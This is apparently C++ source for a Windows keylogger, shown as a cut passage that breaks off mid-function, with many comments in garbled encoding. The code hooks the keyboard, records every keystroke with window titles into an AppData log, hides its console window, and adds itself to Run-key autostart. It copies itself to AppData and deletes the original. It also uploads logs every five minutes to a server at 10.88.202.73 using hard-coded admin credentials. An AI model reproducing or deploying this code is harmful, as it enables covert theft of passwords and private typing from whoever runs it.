#define UNICODE
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <regex>
#include <algorithm>
#include <curl/curl.h>
#include <nlohmann/json.hpp>    
#include <cstring>
#include <cstdio>
#include <sstream>
#include <time.h>
#include <map>
#include <shlwapi.h>
#include <shellapi.h>
#include <atomic>
#include <shlobj.h>          // SHGetFolderPath
#include <objbase.h>         // CoInitialize, CoUninitialize
#include <shobjidl.h>        // IShellLink
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)

// Defines whether you want to enable or disable 
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)

// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0

// defines if ignore mouseclicks
#define mouseignore

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

bool isRecording = true;
HHOOK _hook;

// �ϴ����ܿ��Ʊ���
std::atomic<bool> uploadEnabled{ false };
std::atomic<bool> uploadThreadRunning{ false };
HANDLE hUploadThread = NULL;        // �ϴ��߳̾��

// ---------------------- ǰ������ ----------------------
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
std::string readFileContent(const std::string& filePath);
std::string getExecutableDir();
// ----------------------------------------------------

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN,	"\n" },
    {VK_SPACE,	"_" },
    {VK_TAB,	"[TAB]" },
    {VK_SHIFT,	"[SHIFT]" },
    {VK_LSHIFT,	"[LSHIFT]" },
    {VK_RSHIFT,	"[RSHIFT]" },
    {VK_CONTROL,	"[CONTROL]" },
    {VK_LCONTROL,	"[LCONTROL]" },
    {VK_RCONTROL,	"[RCONTROL]" },
    {VK_MENU,	"[ALT]" },
    {VK_LWIN,	"[LWIN]" },
    {VK_RWIN,	"[RWIN]" },
    {VK_ESCAPE,	"[ESCAPE]" },
    {VK_END,	"[END]" },
    {VK_HOME,	"[HOME]" },
    {VK_LEFT,	"[LEFT]" },
    {VK_RIGHT,	"[RIGHT]" },
    {VK_UP,		"[UP]" },
    {VK_DOWN,	"[DOWN]" },
    {VK_PRIOR,	"[PG_UP]" },
    {VK_NEXT,	"[PG_DOWN]" },
    {VK_OEM_PERIOD,	"." },
    {VK_DECIMAL,	"." },
    {VK_OEM_PLUS,	"+" },
    {VK_OEM_MINUS,	"-" },
    {VK_ADD,		"+" },
    {VK_SUBTRACT,	"-" },
    {VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif
// ȫ�ֱ��������ڴ洢����ͼ�� ID �ʹ��ھ��
static HWND g_hNotifyWnd = NULL;
static UINT g_nNotifyId = 0;

// ���ش��ڵ���Ϣ��������
LRESULT CALLBACK NotifyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

// ��ʼ�����ش��ڣ���һ�Σ�
void InitNotifyWindow()
{
    if (g_hNotifyWnd != NULL) return;
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = NotifyWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"KeyloggerNotifyClass";
    RegisterClass(&wc);
    g_hNotifyWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, wc.hInstance, NULL);
    if (g_hNotifyWnd) g_nNotifyId = (UINT)(ULONG_PTR)g_hNotifyWnd;
}

// ��ʾ֪ͨ�����ݣ���ʧ��ʱ���˵� MessageBox
void ShowToastNotification(const std::wstring& title, const std::wstring& content)
{
    InitNotifyWindow();  // ȷ�����ش��ڴ���
    if (!g_hNotifyWnd)
    {
        MessageBox(NULL, content.c_str(), title.c_str(), MB_OK);
        return;
    }

    NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
    nid.hWnd = g_hNotifyWnd;
    nid.uID = g_nNotifyId;
    nid.uFlags = NIF_ICON | NIF_TIP | NIF_INFO;
    nid.dwInfoFlags = NIIF_INFO;
    wcscpy_s(nid.szInfo, content.c_str());
    wcscpy_s(nid.szInfoTitle, title.c_str());
    // ʹ��Ĭ��ͼ�꣨�ɴӳ�����Դ���أ��˴��ñ�׼Ӧ��ͼ�꣩
    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);

    // ��������ͼ�꣨����Ѵ��ڣ����޸ģ�
    if (!Shell_NotifyIconW(NIM_ADD, &nid))
    {
        // �������ʧ�ܣ���������Ϊ����ͼ�꣬�����޸�
        Shell_NotifyIconW(NIM_MODIFY, &nid);
    }
    else
    {
        // �����ӵ�ͼ�꣬��Ҫ�ӳ�ɾ���Ա������
        // ����һ���̣߳�10���ɾ��ͼ��
        struct DelayedCleanupData {
            HWND hWnd;
            UINT uID;
        } *pData = new DelayedCleanupData{ g_hNotifyWnd, g_nNotifyId };
        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
            DelayedCleanupData* data = (DelayedCleanupData*)p;
            Sleep(10000);  // �ȴ�10�룬ȷ��������ʾ���
            NOTIFYICONDATAW delNid = { sizeof(NOTIFYICONDATAW) };
            delNid.hWnd = data->hWnd;
            delNid.uID = data->uID;
            Shell_NotifyIconW(NIM_DELETE, &delNid);
            delete data;
            return 0;
            }, pData, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
}

// �ڳ����˳�ʱ��������ͼ�꣨��ѡ�����Ƽ���
void CleanupNotifyIcon()
{
    if (g_hNotifyWnd)
    {
        NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
        nid.hWnd = g_hNotifyWnd;
        nid.uID = g_nNotifyId;
        Shell_NotifyIconW(NIM_DELETE, &nid);
        DestroyWindow(g_hNotifyWnd);
        g_hNotifyWnd = NULL;
    }
}

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore 
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            // get time
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] " << "\n";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    // instead of opening and closing file handlers every time, keep file open and flush.
    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
    FreeConsole();
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

// 自启注册表项名称
const wchar_t* REG_RUN_PATH = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t* APP_NAME = L"MyKeylogger";

// 获取当前程序完整路径
std::wstring GetModulePath()
{
    wchar_t path[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

// 判断是否已设置自启
bool IsAutoStartEnabled()
{
    HKEY hKey;
    bool enabled = false;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        wchar_t value[MAX_PATH];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, APP_NAME, NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS)
        {
            enabled = (GetModulePath() == value);
        }
        RegCloseKey(hKey);
    }
    return enabled;
}

// 设置或取消自启
bool SetAutoStart(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;

    bool result = false;
    if (enable)
    {
        std::wstring path = GetModulePath();
        result = (RegSetValueExW(hKey, APP_NAME, 0, REG_SZ, (BYTE*)path.c_str(), (DWORD)((path.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS);
    }
    else
    {
        result = (RegDeleteValueW(hKey, APP_NAME) == ERROR_SUCCESS);
    }
    RegCloseKey(hKey);
    return result;
}

// 静默启动注册表项
const wchar_t* SILENT_MODE_VALUE = L"SilentMode";

// 获取静默启动状态
bool IsSilentMode()
{
    HKEY hKey;
    DWORD value = 0, size = sizeof(value);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExW(hKey, SILENT_MODE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return value == 1;
        }
        RegCloseKey(hKey);
    }
    return false;
}

// 设置静默启动状态
bool SetSilentMode(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD value = enable ? 1 : 0;
    bool result = (RegSetValueExW(hKey, SILENT_MODE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return result;
}

// 获取本机 IPv4 地址（第一个非回环 IPv4 地址），失败返回 "unknown"
std::string GetLocalIPAddress()
{
    std::string ip = "unknown";
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return ip;

    char hostname[256] = { 0 };
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
    {
        WSACleanup();
        return ip;
    }

    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo* result = nullptr;
    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
    {
        WSACleanup();
        return ip;
    }

    std::string fallback_ip = "unknown";

    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        if (ptr->ai_family == AF_INET)
        {
            char ipstr[INET_ADDRSTRLEN] = { 0 };
            sockaddr_in* sa = (sockaddr_in*)ptr->ai_addr;
            InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
            std::string candidate(ipstr);

            // 优先选择以 "10.88." 开头的 IP
            if (candidate.rfind("10.88.", 0) == 0)
            {
                ip = candidate;
                break;
            }

            // 如果没有找到以 "10.88." 开头的 IP，记录第一个非回环地址作为备用
            if (candidate != "127.0.0.1" && !candidate.empty() && fallback_ip == "unknown")
            {
                fallback_ip = candidate;
            }
        }
    }

    freeaddrinfo(result);
    WSACleanup();

    // 如果没有找到以 "10.88." 开头的 IP，使用第一个非回环地址
    if (ip == "unknown")
    {
        ip = fallback_ip;
    }

    return ip;
}

std::string GetDateString()
{
    char buf[32] = { 0 };
    time_t t = time(NULL);
    struct tm tm_info;
    localtime_s(&tm_info, &t);
    // 格式：YYYYMMDD
    strftime(buf, sizeof(buf), "%Y%m%d", &tm_info);
    return std::string(buf);
}

// ��ȡ��־Ŀ¼��%appdata%\Keylogger��
std::string GetLogDirectory()
{
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path)))
    {
        std::wstring appdata(path);
        std::wstring logDirW = appdata + L"\\Keylogger";
        // ȷ��Ŀ¼����
        if (!fs::exists(logDirW))
        {
            fs::create_directories(logDirW);
        }
        // ת��Ϊ���ֽ��ַ���
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), NULL, 0, NULL, NULL);
        std::string logDir(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), &logDir[0], size_needed, NULL, NULL);
        return logDir;
    }
    // ���ʧ�ܣ����ص�ǰĿ¼
    return ".\\";
}

std::string MakeOutputFilename()
{
    std::string ip = GetLocalIPAddress();
    // 将 IP 中可能的非法字符（极少）替换为 '-'
    for (char &c : ip)
    {
        if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '\"' || c == '<' || c == '>' || c == '|')
            c = '-';
    }
    std::string date = GetDateString();
    std::string filename = ip + "_" + date + ".log";
    // ƴ����־Ŀ¼
    std::string logDir = GetLogDirectory();
    return logDir + "\\" + filename;
}

// ---------- �ϴ�������غ��� ----------

// CURL �ص�������������Ӧ����
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    }
    catch (std::bad_alloc& e) {
        return 0;
    }
    return newLength;
}

// 读取文件内容到内存（用于上传）
std::string readFileContent(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "无法打开文件: " << filePath << std::endl;
        return "";
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::string buffer(size, '\0');
    if (!file.read(&buffer[0], size)) {
        std::cerr << "读取文件失败: " << filePath << std::endl;
        return "";
    }
    return buffer;
}

// ��ȡ����ǰִ��Ŀ¼��ע�⣺�˺��������ϴ����ܣ��˴�������
std::string getExecutableDir() {
    char exePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0) {
        std::cerr << "��ȡ����·��ʧ�ܣ�������: " << GetLastError() << std::endl;
        return "";
    }
    std::string path(exePath, len);
    size_t lastSlash = path.find_last_of("\\/");
    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
}

// ɸѡ���ϸ�ʽ����־�ļ����������µ�һ��
std::string findLatestLogFile(const std::string& dir) {
    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
        std::cerr << "Ŀ¼�����ڻ���Ч: " << dir << std::endl;
        return "";
    }

    // �������ʽ��ƥ�� <IP>_<YYYYMMDD>.log ��ʽ
    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    std::smatch match;

    std::vector<std::pair<std::string, std::string>> validLogs;  // �洢���ļ��������ڣ�

    // ����Ŀ¼�µ������ļ�
    for (const auto& entry : fs::directory_iterator(dir)) {
        if (entry.is_regular_file()) {  // ֻ�����ļ�
            std::string fileName = entry.path().filename().string();
            if (std::regex_match(fileName, match, logPattern)) {
                // ��ȡ���ڲ��֣���2�������飩
                std::string dateStr = match[2].str();
                validLogs.emplace_back(fileName, dateStr);
                std::cout << "���ַ��ϸ�ʽ����־�ļ�: " << fileName << "������: " << dateStr << "��" << std::endl;
            }
        }
    }

    if (validLogs.empty()) {
        std::cerr << "δ�ҵ����ϸ�ʽ����־�ļ���<IP>_<YYYYMMDD>.log��" << std::endl;
        return "";
    }

    // �����ڽ����������µ�������ǰ�棩
    std::sort(validLogs.begin(), validLogs.end(),
        [](const auto& a, const auto& b) {
            return a.second > b.second;  // �����ַ���ֱ�ӱȽϣ�YYYYMMDD ��ʽ��ֱ������
        });

    // ���������ļ�������·��
    return dir + "\\" + validLogs[0].first;
}

// 获取 token
std::string api_get() {
    CURL* curl = curl_easy_init();
    std::string response_string;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/auth/login");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        const char* data = R"({"username": "admin", "password": "adm1n5"})";
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "登录请求失败: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            try {
                json j = json::parse(response_string);
                if (j["code"] == 200 && j["data"].contains("token")) {
                    return j["data"]["token"];
                }
                else {
                    std::cerr << "登录失败: " << response_string << std::endl;
                }
            }
            catch (const std::exception& e) {
                std::cerr << "解析登录响应失败: " << e.what() << std::endl;
            }
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    else {
        std::cerr << "curl 初始化失败" << std::endl;
    }
    return "";
}

// �ϴ��ļ���������
bool uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath)
{
    if (token.empty()) {
        std::cerr << "token Ϊ�գ��޷��ϴ�" << std::endl;
        return false;
    }

    std::string fileContent = readFileContent(localFilePath);
    if (fileContent.empty()) {
        return false;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl ��ʼ��ʧ��" << std::endl;
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/fs/put");
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
    headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
    headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        std::cerr << "�ϴ�ʧ��: " << curl_easy_strerror(res) << std::endl;
        return false;
    }
    std::cout << "�ϴ���Ӧ: " << response << std::endl;
    // �ɸ�����Ҫ���� response �ж��Ƿ�ɹ����˴�����Ϊ��Ӧ�ǿռ��ɹ�
    return true;
}
// �ϴ�������־�ļ��ķ�װ����
void uploadLatestLog()
{
    // 1. ��ȡ token
    std::string token = api_get();
    if (token.empty()) {
        std::cerr << "��ȡ token ʧ�ܣ������ϴ�" << std::endl;
        ShowToastNotification(L"�ϴ�����", L"��ȡ��¼ƾ֤ʧ�ܣ����Զ��ر��ϴ�����");
        uploadEnabled = false;
        uploadThreadRunning = false;
        return;
    }

    // 2. ��ȡ��־Ŀ¼
    std::string logDir = GetLogDirectory();
    if (logDir.empty()) return;

    // 3. �������µ���־�ļ�
    std::string latestLogPath = findLatestLogFile(logDir);
    if (latestLogPath.empty()) return;

    // 4. ���÷�����·��
    fs::path logPath(latestLogPath);
    std::string fileName = logPath.filename().string();
    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;

    // 5. �ϴ��ļ�
    bool success = uploadFile(token, latestLogPath, serverFile);
    if (!success) {
        std::cerr << "�ϴ�ʧ�ܣ����Զ��ر��ϴ�����" << std::endl;
        ShowToastNotification(L"�ϴ�����", L"�ļ��ϴ�ʧ�ܣ����Զ��ر��ϴ�����");
        uploadEnabled = false;
        uploadThreadRunning = false;
    }
}

// �ϴ��̺߳���
DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
{
    while (uploadEnabled && uploadThreadRunning)
    {
        uploadLatestLog();
        for (int i = 0; i < 300 && uploadEnabled && uploadThreadRunning; ++i)
            Sleep(1000);
    }
    uploadThreadRunning = false;
    return 0;
}
// ---------- ���̹��ӻص����� ----------
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // Check for Ctrl + Shift + Alt + P
            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                isRecording = !isRecording;
                if (isRecording)
                {
                    std::cout << "¼�Ƽ���\n";
                    ShowToastNotification(L"����¼(/�R���Q)/", L"¼�Ƽ���");
                }
                else
                {
                    std::cout << "¼����ͣ\n";
                    ShowToastNotification(L"��¼���t(���أ���)", L"¼����ͣ");
                }
            }
            // Check for Ctrl + Shift + Alt + Q
            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                ShowToastNotification(L"�治¼����*�b�`�b*��\n\n�ǰݰ���(o�b���b)o��", L"¼�ƽ���");
                std::cout << "¼�ƽ���\n";
                Sleep(2000);
                CleanupNotifyIcon();   // ��������ͼ��
                ReleaseHook();
                output_file.close();
                exit(0);
            }
            // Check for Ctrl + Shift + Alt + S (��������)
            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool enabled = IsAutoStartEnabled();
                if (SetAutoStart(!enabled))
                {
                    if (!enabled)
                        ShowToastNotification(L"������Ϊ�����Ԇ� awa", L"��������");
                    else
                        ShowToastNotification(L"��ȡ���������� qaq", L"��������");
                }
                else
                {
                    ShowToastNotification(L"��������ʧ�ܣ����Թ���Ա��������w", L"��������");
                }
            }
            // Check for Ctrl + Shift + Alt + D (��Ĭ����)
            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool silent = IsSilentMode();
                if (SetSilentMode(!silent))
                {
                    if (!silent)
                        ShowToastNotification(L"������Ϊ��Ĭ�������´��������ٵ�����", L"��Ĭ����");
                    else
                        ShowToastNotification(L"��ȡ����Ĭ�������´������ᵯ����", L"��Ĭ����");
                }
                else
                {
                    ShowToastNotification(L"���þ�Ĭ����ʧ�ܣ����Թ���Ա��������", L"��Ĭ����");
                }
            }
            // Check for Ctrl + Shift + Alt + U (�ϴ�����)
            else if (kbdStruct.vkCode == 'U' && (GetKeyState(VK_CONTROL) & 0x8000) &&
                (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool newState = !uploadEnabled;
                if (newState)
                {
                    // ����߳�δ���У�����֮ǰ�����رգ������������߳�
                    if (!uploadThreadRunning)
                    {
                        uploadThreadRunning = true;
                        hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
                        if (hUploadThread)
                            CloseHandle(hUploadThread);
                        ShowToastNotification(L"�ϴ�����", L"�ϴ������ѿ������������ϴ���־�ļ�");
                    }
                    else
                    {
                        ShowToastNotification(L"�ϴ�����", L"�ϴ������ѿ������߳��������У�");
                    }
                    uploadEnabled = true;
                }
                else
                {
                    uploadEnabled = false;
                    uploadThreadRunning = false;
                    if (hUploadThread)
                        WaitForSingleObject(hUploadThread, 5000);
                    ShowToastNotification(L"�ϴ�����", L"�ϴ������ѹر�");
                }
            }
            else
            {
                // save to file only if recording
                if (isRecording)
                {
                    Save(kbdStruct.vkCode);
                }
            }
        }
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

// ==================== �������ܣ��Ը��ơ�ɾ��ԭ�ļ���������ݷ�ʽ ====================

// ������ݷ�ʽ��ͨ�ã�
bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath)
{
    // �����ݷ�ʽ�Ѵ��ڣ����ظ�����
    if (fs::exists(shortcutPath))
        return true;

    CoInitialize(NULL);
    IShellLinkW* psl = NULL;
    IPersistFile* ppf = NULL;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl);
    if (SUCCEEDED(hr))
    {
        psl->SetPath(targetPath.c_str());
        psl->SetDescription(L"Keyboard Logger");
        hr = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
        if (SUCCEEDED(hr))
        {
            hr = ppf->Save(shortcutPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}

// �����Ը��ơ�ɾ��ԭ�ļ���������ݷ�ʽ
void HandleSelfCopyAndDelete()
{
    // ��ȡĿ��Ŀ¼��%appdata%\Keylogger
    wchar_t appdataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath)))
        return;

    std::wstring targetDir = std::wstring(appdataPath) + L"\\Keylogger";
    fs::create_directories(targetDir);

    std::wstring currentExe = GetModulePath();
    std::wstring targetExe = targetDir + L"\\" + fs::path(currentExe).filename().wstring();

    // �����ǰ������Ŀ��Ŀ¼����ִ�и��ơ�������ݷ�ʽ��������ɾ��
    if (currentExe != targetExe)
    {
        // ����������Ŀ��Ŀ¼
        if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
        {
            MessageBoxW(NULL, L"���������� %appdata%\\Keylogger ʧ��", L"����", MB_ICONERROR);
            return;
        }

        // ��ԭ��������Ŀ¼����ָ���³���Ŀ�ݷ�ʽ
        std::wstring originalDir = fs::path(currentExe).parent_path().wstring();
        std::wstring shortcutName = fs::path(currentExe).stem().wstring() + L".lnk";
        std::wstring shortcutPath = originalDir + L"\\" + shortcutName;
        CreateShortcut(targetExe, shortcutPath);

        // �����³��򣬴���ԭ����·���Ա�ɾ��
        std::wstring params = L"--delete-old \"" + currentExe + L"\"";
        wchar_t paramsBuf[1024];
        wcscpy_s(paramsBuf, params.c_str());

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessW(targetExe.c_str(), paramsBuf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            ExitProcess(0);   // ��ǰ�����˳�
        }
        else
        {
            MessageBoxW(NULL, L"��������ʧ��", L"����", MB_ICONERROR);
        }
    }
    else
    {
        // �Ѿ���Ŀ��Ŀ¼������Ƿ���ɾ�����ļ�������
        int argc;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argc >= 3 && wcscmp(argv[1], L"--delete-old") == 0)
        {
            std::wstring oldPath = argv[2];
            // �ȴ�ԭ������ȫ�˳��������ӳ٣�
            Sleep(5000);  // 5�룬�㹻ԭ�����˳�

            // ����ɾ�������Զ��
            bool deleted = false;
            DWORD lastError = 0;
            for (int i = 0; i < 10; ++i)
            {
                // ����ļ��Ƿ����
                if (!fs::exists(oldPath))
                {
                    deleted = true;
                    break;
                }

                // �Ƴ�ֻ�����ԣ�����У�
                SetFileAttributesW(oldPath.c_str(), FILE_ATTRIBUTE_NORMAL);

                // ����ɾ��
                if (DeleteFileW(oldPath.c_str()))
                {
                    deleted = true;
                    break;
                }

                lastError = GetLastError();
                // ����ļ���ռ�ã��ȴ�����
                if (lastError == ERROR_SHARING_VIOLATION || lastError == ERROR_ACCESS_DENIED)
                {
                    Sleep(1000);
                    continue;
                }
                else
                {
                    // ����������������
                    break;
                }
            }

            if (!deleted)
            {
                // �������ɾ��ʧ�ܣ������ӳ�ɾ����������ɾ����
